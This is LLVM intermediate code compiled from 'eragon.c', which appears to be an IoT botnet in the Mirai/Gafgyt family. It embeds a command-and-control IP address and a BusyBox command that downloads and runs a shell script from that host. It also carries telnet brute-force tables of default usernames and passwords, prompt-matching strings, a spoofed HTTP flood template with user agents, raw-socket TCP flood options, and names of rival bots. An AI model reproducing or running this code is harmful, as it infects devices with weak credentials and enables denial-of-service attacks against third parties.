; ModuleID = 'host/ir_O3/eragon.ll'
source_filename = "eragon.c"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.ifreq = type { %union.anon.4, %union.anon.5 }
%union.anon.4 = type { [16 x i8] }
%union.anon.5 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@.str = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.1 = private unnamed_addr constant [16 x i8] c"/usr/bin/python\00", align 1
@.str.2 = private unnamed_addr constant [7 x i8] c"SERVER\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"DEVICE\00", align 1
@.str.4 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.5 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.6 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.7 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.8 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.9 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.10 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.11 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.12 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.13 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.14 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.15 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.16 = private unnamed_addr constant [15 x i8] c"wii libnup/1.0\00", align 1
@.str.17 = private unnamed_addr constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00", align 1
@.str.18 = private unnamed_addr constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00", align 1
@.str.19 = private unnamed_addr constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00", align 1
@.str.20 = private unnamed_addr constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00", align 1
@.str.21 = private unnamed_addr constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.22 = private unnamed_addr constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00", align 1
@.str.23 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.24 = private unnamed_addr constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00", align 1
@.str.25 = private unnamed_addr constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00", align 1
@.str.26 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.27 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00", align 1
@.str.28 = private unnamed_addr constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00", align 1
@.str.29 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00", align 1
@.str.30 = private unnamed_addr constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00", align 1
@.str.31 = private unnamed_addr constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00", align 1
@.str.32 = private unnamed_addr constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.33 = private unnamed_addr constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00", align 1
@.str.34 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00", align 1
@.str.35 = private unnamed_addr constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00", align 1
@.str.36 = private unnamed_addr constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00", align 1
@.str.37 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.38 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00", align 1
@.str.39 = private unnamed_addr constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@useragents = local_unnamed_addr global [36 x i8*] [i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.39, i32 0, i32 0)], align 16
@.str.40 = private unnamed_addr constant [15 x i8] c"185.52.1.73:27\00", align 1
@ServerInfo = local_unnamed_addr global [1 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.40, i32 0, i32 0)], align 8
@.str.41 = private unnamed_addr constant [117 x i8] c"cd /tmp; /bin/busybox wget http://185.52.1.73/bins.sh -O - > jeSjax; /bin/busybox chmod 777 jeSjax; sh /tmp/jeSjax\0D\0A\00", align 1
@BusyBoxPayload = local_unnamed_addr global i8* getelementptr inbounds ([117 x i8], [117 x i8]* @.str.41, i64 0, i64 0), align 8
@.str.42 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.43 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.44 = private unnamed_addr constant [10 x i8] c"volition\00\00", align 1
@.str.45 = private unnamed_addr constant [8 x i8] c"daemon\00\00", align 1
@.str.46 = private unnamed_addr constant [20 x i8] c"support\00supervisor\00\00", align 1
@.str.47 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.48 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.49 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.50 = private unnamed_addr constant [6 x i8] c"ubnt\00\00", align 1
@.str.51 = private unnamed_addr constant [9 x i8] c"usuario\00\00", align 1
@.str.52 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@usernames = local_unnamed_addr global [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0)], align 16
@.str.53 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.54 = private unnamed_addr constant [18 x i8] c"support\00zyad1234\00\00", align 1
@.str.55 = private unnamed_addr constant [6 x i8] c"anko\00\00", align 1
@.str.56 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.57 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@.str.58 = private unnamed_addr constant [10 x i8] c"hunt5759\00\00", align 1
@.str.59 = private unnamed_addr constant [5 x i8] c"5up\00\00", align 1
@.str.60 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.61 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.62 = private unnamed_addr constant [8 x i8] c"xc3511\00\00", align 1
@.str.63 = private unnamed_addr constant [10 x i8] c"zsun1188\00\00", align 1
@.str.64 = private unnamed_addr constant [11 x i8] c"awind5885\00\00", align 1
@.str.65 = private unnamed_addr constant [8 x i8] c"hi3518\00\00", align 1
@.str.66 = private unnamed_addr constant [11 x i8] c"a6a7wimax\00\00", align 1
@.str.67 = private unnamed_addr constant [8 x i8] c"radius\00\00", align 1
@.str.68 = private unnamed_addr constant [8 x i8] c"calvin\00\00", align 1
@.str.69 = private unnamed_addr constant [6 x i8] c"tech\00\00", align 1
@.str.70 = private unnamed_addr constant [9 x i8] c"aquario\00\00", align 1
@.str.71 = private unnamed_addr constant [8 x i8] c"asante\00\00", align 1
@.str.72 = private unnamed_addr constant [18 x i8] c"vertex25ektks123\00\00", align 1
@.str.73 = private unnamed_addr constant [9 x i8] c"cat1029\00\00", align 1
@passwords = local_unnamed_addr global [36 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.73, i32 0, i32 0)], align 16
@.str.74 = private unnamed_addr constant [15 x i8] c"/dev/netslink/\00", align 1
@.str.75 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.76 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.77 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.78 = private unnamed_addr constant [10 x i8] c"/var/run/\00", align 1
@.str.79 = private unnamed_addr constant [10 x i8] c"/dev/shm/\00", align 1
@.str.80 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.81 = private unnamed_addr constant [7 x i8] c"/boot/\00", align 1
@.str.82 = private unnamed_addr constant [6 x i8] c"/usr/\00", align 1
@.str.83 = private unnamed_addr constant [6 x i8] c"/opt/\00", align 1
@tmpdirs = local_unnamed_addr global [11 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.83, i32 0, i32 0), i8* null], align 16
@.str.84 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.85 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.86 = private unnamed_addr constant [8 x i8] c"sername\00", align 1
@.str.87 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@advances = global [5 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.87, i32 0, i32 0), i8* null], align 16
@.str.88 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.89 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.90 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.91 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.92 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.93 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.94 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@fails = global [8 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.94, i32 0, i32 0), i8* null], align 16
@.str.95 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.96 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.97 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@successes = global [4 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0), i8* null], align 16
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0), i8* null], align 16
@botnetServer = local_unnamed_addr global i32 -1, align 4
@numpids = local_unnamed_addr global i64 0, align 8
@macAddress = local_unnamed_addr global [6 x i8] zeroinitializer, align 1
@KadenCommStock = local_unnamed_addr global i32 0, align 4
@Q = internal unnamed_addr global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal unnamed_addr global i32 4095, align 4
@c = internal unnamed_addr global i32 362436, align 4
@x = internal unnamed_addr global i32 0, align 4
@y = internal unnamed_addr global i32 0, align 4
@z = internal unnamed_addr global i32 0, align 4
@w = internal unnamed_addr global i32 0, align 4
@rand_alphastr.alphaset = internal unnamed_addr constant [32 x i8] c"kt8lmno5abghiiosdf63rlrs83rs9j0\00", align 16
@pids = common local_unnamed_addr global i32* null, align 8
@.str.99 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@ourIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@.str.100 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.101 = private unnamed_addr constant [20 x i8] c"Eragon Bruted -> %s\00", align 1
@.str.102 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.103 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.104 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.105 = private unnamed_addr constant [265 x i8] c"\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\00", align 1
@.str.106 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.107 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.108 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.109 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.110 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.111 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.112 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.113 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.114 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.115 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.116 = private unnamed_addr constant [16 x i8] c"VSzNC0CJti3ouku\00", align 1
@.str.117 = private unnamed_addr constant [16 x i8] c"yhJyMAqx7DZa0kg\00", align 1
@.str.118 = private unnamed_addr constant [16 x i8] c"1Cp9MEDMN6B5L1K\00", align 1
@.str.119 = private unnamed_addr constant [11 x i8] c"miraiMIRAI\00", align 1
@.str.120 = private unnamed_addr constant [10 x i8] c"stdflood4\00", align 1
@.str.121 = private unnamed_addr constant [11 x i8] c"7XLPHoxkvL\00", align 1
@.str.122 = private unnamed_addr constant [11 x i8] c"jmQvYBdRZA\00", align 1
@.str.123 = private unnamed_addr constant [11 x i8] c"eNxERkyrfR\00", align 1
@.str.124 = private unnamed_addr constant [11 x i8] c"qHjTXcMbzH\00", align 1
@.str.125 = private unnamed_addr constant [15 x i8] c"chickennuggets\00", align 1
@.str.126 = private unnamed_addr constant [13 x i8] c"ilovecocaine\00", align 1
@.str.127 = private unnamed_addr constant [7 x i8] c"666666\00", align 1
@.str.128 = private unnamed_addr constant [9 x i8] c"88888888\00", align 1
@.str.129 = private unnamed_addr constant [11 x i8] c"0nnf0l20im\00", align 1
@.str.130 = private unnamed_addr constant [11 x i8] c"uq7ajzgm0a\00", align 1
